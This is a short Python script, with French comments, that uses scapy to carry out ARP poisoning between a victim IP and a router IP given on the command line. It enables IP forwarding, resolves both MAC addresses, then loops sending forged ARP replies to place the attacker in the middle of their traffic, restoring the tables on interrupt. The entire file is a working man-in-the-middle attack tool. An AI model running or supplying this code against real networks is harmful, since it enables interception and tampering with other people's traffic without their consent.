# Permet de faire une attaque de type ARP-POISONING
# Usage:  python arp.py -v 192.168.0.5 -r 192.168.0.1
#
# Inspire fortement de http://danmcinerney.org/arp-poisoning-with-python-2/
from scapy.all import *
import argparse
import signal
import sys
import logging
import time

class arpPoison: 
    def __init__(self, routerIp, victimIp):
        logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
        #sudo check 
        if os.geteuid() != 0:
            sys.exit("[!] Please run as root")
        self.routerIP = routerIp
        self.victimIP = victimIp
        self.routerMAC = self.MAC_Original(self.routerIP)
        self.victimMAC = self.MAC_Original(self.victimIP)

        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
             ipf.write('1\n')
        def signal_handler(signal, frame):
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
                ipf.write('0\n')
            self.restore()
        signal.signal(signal.SIGINT, signal_handler)
        while True:
            self.poison()
            time.sleep(1.5)


    def MAC_Original(self,ip):
        ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
        for s,r in ans:
            return r[Ether].src

    def poison(self):
        send(ARP(op=2, pdst=self.victimIP, psrc=self.routerIP, hwdst=self.victimMAC))
        send(ARP(op=2, pdst=self.routerIP, psrc=self.victimIP, hwdst=self.routerMAC))

    def restore(self):
        send(ARP(op=2, pdst=self.routerIP, psrc=self.victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.victimMAC), count=3)
        send(ARP(op=2, pdst=self.victimIP, psrc=self.routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.routerMAC), count=3)
        sys.exit("Arret de l'attaque...")
        